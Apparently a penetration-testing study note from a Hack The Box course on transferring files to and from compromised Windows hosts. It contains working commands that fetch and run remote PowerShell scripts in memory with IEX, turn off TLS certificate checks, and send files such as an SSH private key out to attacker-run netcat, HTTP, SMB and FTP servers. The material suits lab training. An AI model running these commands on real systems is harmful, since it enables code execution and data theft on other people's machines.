
- **Downloads**
	- **Powershell Downloads**
		- [[Windows File Transfers#Copy Base64 Encoded Files To Windows|Copy Base64 Encoded Files To Windows]]
		- [[Windows File Transfers#Powershell DownloadFile Method|Powershell Download File]]
		- [[Windows File Transfers#Powershell DownloadString - Fileless Method|Powershell Fileless Download]]
		- [[Windows File Transfers#Common Errors with Powershell|Common Errors With Powershell]]
		- [List of PowerShell Download Cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
	- **SMB Downloads**
		- [[Windows File Transfers#SMB Downloads|SMB Downloads]]
	- **FTP Downloads**
		- [[Windows File Transfers#FTP Downloads|FTP Downloads]]

- **Uploads**
	- **Powershell Uploads**
		- [[Windows File Transfers#PowerShell Web Uploads|Powershell Web Uploads]]
	- **SMB Uploads**
		- [[Windows File Transfers#SMB Uploads|SMB Uploads]]
	- **FTP Uploads**
		- [[Windows File Transfers#FTP Uploads|FTP Uploads]]

___

# Download Methods

#### Copy Base64 Encoded Files To Windows
Example: SSH key from linux to Windows
- Linux
	1. `md5sum id_rsa`
	2. `cat id_rsa | base64 -w 0;echo`
- Copy the output to Windows Powershell. Decode and confirm hash.
	- `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String(<base64>"))`
	- `Get-FileHash C:\Users\Public\id_rsa -Algorithm md5`

#### Copy Base64 Encoded Files From Windows
- **Encode File With Powershell and get hash**
	- `[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))`
	- `Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash`
- **Copy, Decode and Check Hash on Attack Box**
	- `echo <base64string> | base64 -d > <outfile>`
	- `md5sum <outfile>`


## PowerShell Web Downloads
- [List of PowerShell download cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

- Most companies allow HTTP and HTTPS outbound traffic through the firewall.
	- Still, web filtering solutions can prevent access to specific website categories, block the download of file types (like .exe) or only allow access to whitelisted domains.
- In any version of Powershell [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) can be used to download a file of HTTP, HTTPS, or FTP.
- [Table](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) of WebClient methods for downloading data:
![[2023-03-22 14_50_39-Hack The Box - Academy.png | 700]]

#### Powershell DownloadFile Method

- **DownloadFile**
	- `(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')`

- **DownloadFileAsync**
	- `(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')`

Examples:
```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')


PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerView.ps1', 'PowerViewAsync.ps1')
```

#### Powershell DownloadString - Fileless Method
- Instead of downloading a Powershell script to disk we can run it in memory using [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) or `IEX`

- `IEX (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')`

- Or via pipe:
- `(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>') | IEX`

#### Powershell Invoke-WebRequest
- In PowerShell 3.0+ [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) is available but is noticeably slower. 
- You can use the aliases `iwr`, `curl`, and `wget` instead of the full `Invoke-WebRequest` name.
	- `Invoke-WebRequest <Target File URL> -OutFile <Output File Name>`


#### Common Errors with Powershell
- If Internet Explorer's first-launch coonfiguration is not completed, it may prevent the download.
- Bypass this using the parameter `-UseBasicParsing`
- Example:
``` powershell
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorers first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

- Another error is related tothe SSL/TLS secure channel if the certificate is not trusted.
- To bypass:
	- `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`

___

## SMB Downloads
- We can download files from the Attacking machine easily by creating a SMB server with [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)

- **Create the SMB Server**
	- `sudo impacket-smbserver share -smb2support /tmp/smbshare`  or `.` for current dir
- **Copy a file from the SMB Server**
	- `C:\htb> copy \\192.168.220.133\share\nc.exe` - **copy** downloads the file to the current directory
	- New versions of Windows block unauthenticated guest access and will give an error:
		- `You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.`
- To workaround this:
- **Create the SMB Server with a Username and Password**
	- `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`
- **Mount the SMB Share with Username and Password**
	- `net use n: \\192.168.220.133\share /user:test test`
- **Unmount SMB Share**
	- `net use \\ATTACKER_IP\share /del`

___
## FTP Downloads
- We can configure an FTP server using Python3 pyftpdlib. 

- **Install Python FTP Server**
	- `sudo pip3 install pyftpdlib`

- **Seting Up FTP Server**
	- `sudo python3 -m pyftpdlib --port 21`

- **Transfer file from FTP Server Using Powershell**
	- `(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')`

- **Create a Command File for the FTP Client**
- For use when we don't have an interactive shell
``` shell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

___

# Upload Operations

### PowerShell Web Uploads
- Powershell doesn't have built in upload operations but we can use `Invoke-WebRequest` or `Invoke-RestMethod` to build one.
- For the webserver to upload to, we can use [uploadserver](https://github.com/Densaugeo/uploadserver) for python

- **Install and Run Upload Server**
	- `pip3 install uploadserver`
	- `python3 -m uploadserver`

#### Powershell Upload Script
- We can use [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1)
	- The script's parameters are `-File` for file path and `-Uri` for server url.

- **Load PSUpload into Memory**
	- `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')`
- **Execute Script and Upload**
	- `Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts`

#### PowerShell Base64 Web Upload
- Uses netcat to listen
- Uses `Invoke-WebRequest` POST request so requires no outside scripts.

- **Setup NetCat Listener**
	- `nc -lvnp 8000`

- **Convert File to Base 64 and Send POST request**
	- `$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))`
	- `Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64`

- Catch the base64 data in netcat and then decode
	- `echo <base64> | base64 -d -w 0 > file`

___
## SMB Uploads
- SMB outbound traffic is usually restricted for security reasons
- However we can run SMB over HTTP with [WebDav](https://datatracker.ietf.org/doc/html/rfc4918). The WebDav protocol enables a webserver to behave like a fileserver.

- **Installing WebDav Server**
	- `sudo pip install wsgidav cheroot`

- **Using WebDav Python Module**
	- `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous `

- **Connecting to WebDav Share**
	- `dir \\<IP>\DavWWWRoot`
		- DavWWWRoot is a special keyword recognized by Windows Shell to connect to the root folder of a share. If you specify a folder it is not needed.

- **Uploading Files Using SMB**
	- `copy c:\file \\<IP>\DavWWWRoot\`
	- `copy c:\file \\<IP>\SomeFolder\`

___
## FTP Uploads
- **Setup**
	- Similar to downloading but pyftpdlib needs the `--write` flag enabled
	- `sudo python3 -m pyftpdlib --port 21 --write`

- **PowerShell Upload File**
	- `(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`
- **Create a Command File for the FTP Client**
``` shell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```